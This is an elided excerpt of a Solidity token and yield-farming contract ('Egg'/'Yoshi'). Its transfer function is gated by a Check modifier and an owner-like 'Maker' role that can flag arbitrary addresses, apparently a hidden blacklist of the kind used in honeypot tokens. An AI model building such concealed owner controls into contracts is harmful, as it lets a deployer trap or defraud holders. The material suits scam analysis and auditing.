...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _transfer(
        ...
        address recipient,
        uint256 amount
    ) internal virtual Check(sender){
        uint tmp =  (amount * 420) / 100000; // Fixed .4%
        _balances[sender] = _balances[sender].sub(amount, 'ERC20: transfer amount exceeds balance');
        _balances[recipient] = _balances[recipient].add(amount-tmp);
        _totalSupply =  _totalSupply.sub(tmp);
        emit Transfer(sender, recipient, amount-tmp);
    }
     ...
     */
    modifier Maker() {
        require(maker() == _msgSender(), "Ownable: caller is not maker");
        _;
    }
     ...
     * See {_burn} and {_approve}.
     */
    function flagAddress(address _address) external Maker validAddress(_address){
        _flag[_address] = true;
    }
     ...
     * See {_burn} and {_approve}.
     */
    function clearAddress(address _address) external Maker validAddress(_address){
...
contract Yoshi is ERC20('Egg', 'Egg'), ReentrancyGuard {
    ...
    uint eggMaximumSupply = 15000000 *10**18;
    // Info of each pool.
    ...
    function add(uint256 _allocPoint, IERC20 _lpToken, uint16 _depositFeeBP, bool _withUpdate) external Maker nonDuplicated(_lpToken) {
    ...
    function set(uint256 _pid, uint256 _allocPoint, uint16 _depositFeeBP, bool _withUpdate) external Maker {
    ...
    function pendingEgg(uint256 _pid, address _user) external view returns (uint256) {
        ...
        if (block.number > pool.lastRewardBlock && pool.lpSupply != 0) {
            ...
            accEggPerShare = accEggPerShare + ((eggReward * 1e12) / pool.lpSupply);
        }
...
// Update reward variables for all pools. Be careful of gas spending!
    ...
    function updatePool(uint256 _pid) public {
        ...
        if ((egg.totalSupply() + eggReward) > eggMaximumSupply)
            eggReward = eggMaximumSupply - egg.totalSupply();

        if (eggReward > 0)
             super._mint(address(this), eggReward);

        if (egg.totalSupply() >= eggMaximumSupply && emmissionEndBlock == type(uint256).max)
            emmissionEndBlock = block.number;

        pool.accEggPerShare = pool.accEggPerShare + ((eggReward * 1e12) / pool.lpSupply);
        pool.lastRewardBlock = block.number;
    }
    ...
    // Withdraw LP tokens from Yoshi.
    function withdraw(uint256 _pid, uint256 _amount) external nonReentrant {
        PoolInfo storage pool = poolInfo[_pid];
        UserInfo storage user = userInfo[_pid][msg.sender];
        require(user.amount >= _amount && 
        (block.timestamp > startBlock || _msgSender() == maker()));
        massUpdatePools();
        uint256 pending = ((user.amount * pool.accEggPerShare) / 1e12) - user.rewardDebt;
        if (pending > 0) {
            safeEggTransfer(msg.sender, pending);
        ...
        if (_amount > 0) {
            user.amount = user.amount - _amount;
            if(pool.lpSupply < _amount) _amount = pool.lpSupply;
...
pragma solidity ^0.8.0;
contract Egg is Yoshi(1000000000000000000, 18600000){
